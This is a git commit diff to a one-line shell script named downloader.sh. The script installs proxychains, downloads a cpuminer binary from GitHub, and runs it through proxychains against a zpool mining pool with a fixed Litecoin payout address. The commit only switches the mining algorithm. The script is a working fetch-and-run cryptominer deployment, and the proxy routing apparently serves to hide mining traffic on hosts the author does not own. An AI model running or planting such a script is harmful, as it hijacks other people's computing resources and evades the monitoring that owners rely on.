473db4d317505c92522ac8a8bda45f2f7605c265
taftgt <tri.sutrisno368@gmail.com>
2022-06-18 21:45:31 +0700

    fix downloader

--- downloader.sh
+++ downloader.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-apt update && apt install proxychains -y && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && proxychains ./cpuminer-avx -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u LerEpCNA6tqUXvKb1VFMZkuBMZHnzXBJec -p c=LTC -t 2
+apt update && apt install proxychains -y && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && proxychains ./cpuminer-avx -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u LerEpCNA6tqUXvKb1VFMZkuBMZHnzXBJec -p c=LTC -t 2
